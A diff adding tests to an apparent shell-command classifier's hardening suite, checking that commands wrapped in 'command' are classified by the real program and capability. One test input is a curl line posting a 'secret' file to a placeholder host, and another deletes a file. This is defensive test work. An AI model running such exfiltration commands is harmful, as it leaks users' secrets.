@@ -169,6 +169,20 @@ describe('hardening round 4: path-form execute and command lookup', () => {
     expect(op?.target.kind).toBe('path');
   });
 
+  test.each([
+    ['command curl -v https://x.test/p -d @secret', 'send', 'curl'],
+    ['command rm -v file.txt', 'delete', 'rm'],
+    ['command cp -v a.txt b.txt', 'write', 'cp'],
+    ['command node -v', 'execute', 'node'],
+  ] as const)(
+    '%s classifies the wrapped program, not a command lookup',
+    (command, capability, program) => {
+      const ops = classify(bash(command));
+      expect(withCap(ops, capability)?.program).toBe(program);
+      expect(ops.some((o) => o.program === 'command')).toBe(false);
+    },
+  );
+
   test('$CMD --help stays execute/none, never read', () => {
     const ops = classify(bash('$CMD --help'));
     expect(withCap(ops, 'read')).toBeUndefined();
